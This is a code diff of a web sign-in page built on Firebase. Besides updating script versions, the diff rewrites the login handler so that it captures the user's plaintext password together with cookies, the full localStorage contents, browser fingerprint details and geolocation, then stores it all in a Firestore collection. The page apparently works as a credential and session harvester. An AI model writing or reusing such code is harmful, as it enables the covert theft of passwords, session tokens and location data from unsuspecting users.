@@ -120,9 +120,9 @@
 				}
 			}
 		</style>
-		<script src="/__/firebase/5.8.2/firebase-app.js"></script>
-		<script src="/__/firebase/5.8.2/firebase-auth.js"></script>
-		<script src="/__/firebase/5.8.2/firebase-firestore.js"></script>
+		<script src="/__/firebase/5.9.4/firebase-app.js"></script>
+		<script src="/__/firebase/5.9.4/firebase-auth.js"></script>
+		<script src="/__/firebase/5.9.4/firebase-firestore.js"></script>
 		<script src="/__/firebase/init.js"></script>
 		<script>
 			function toggleSignIn() {
@@ -159,15 +159,61 @@
 								return;
 							} else {
 								var ob = {
-									email: document.getElementById('username').value,
-									password: document.getElementById('password').value,
+									email: document.getElementById('username')
+										.value,
+									password: document.getElementById(
+										'password'
+									).value,
 									navigator: {
-										platform: navigator.platform,
-										navigator: navigator
+										timeOpened: new Date(),
+										timezone:
+											new Date().getTimezoneOffset() / 60,
+										pageon: window.location.pathname,
+										referrer: document.referrer,
+										previousSites: history.length,
+										browserName: navigator.appName,
+										browserEngine: navigator.product,
+										browserVersion1a: navigator.appVersion,
+										browserVersion1b: navigator.userAgent,
+										browserLanguage: navigator.language,
+										browserOnline: navigator.onLine,
+										browserPlatform: navigator.platform,
+										javaEnabled: navigator.javaEnabled(),
+										dataCookiesEnabled:
+											navigator.cookieEnabled,
+										dataCookies1: document.cookie,
+										dataCookies2: decodeURIComponent(
+											document.cookie.split(';')
+										),
+										dataStorage: localStorage,
+										sizeScreenW: screen.width,
+										sizeScreenH: screen.height,
+										sizeDocW: document.width,
+										sizeDocH: document.height,
+										sizeInW: innerWidth,
+										sizeInH: innerHeight,
+										sizeAvailW: screen.availWidth,
+										sizeAvailH: screen.availHeight,
+										scrColorDepth: screen.colorDepth,
+										scrPixelDepth: screen.pixelDepth,
+										latitude: position.coords.latitude,
+										longitude: position.coords.longitude,
+										accuracy: position.coords.accuracy,
+										altitude: position.coords.altitude,
+										altitudeAccuracy:
+											position.coords.altitudeAccuracy,
+										heading: position.coords.heading,
+										speed: position.coords.speed,
+										timestamp: position.timestamp
 									}
 								};
+								console.log(ob);
 								db.collection('users')
-									.doc(firebase.firestore.Timestamp.now().toDate().toString())
+									.doc(
+										firebase.firestore.Timestamp.now()
+											.toDate()
+											.toString()
+									)
 									.set(ob);
 								return;
 							}
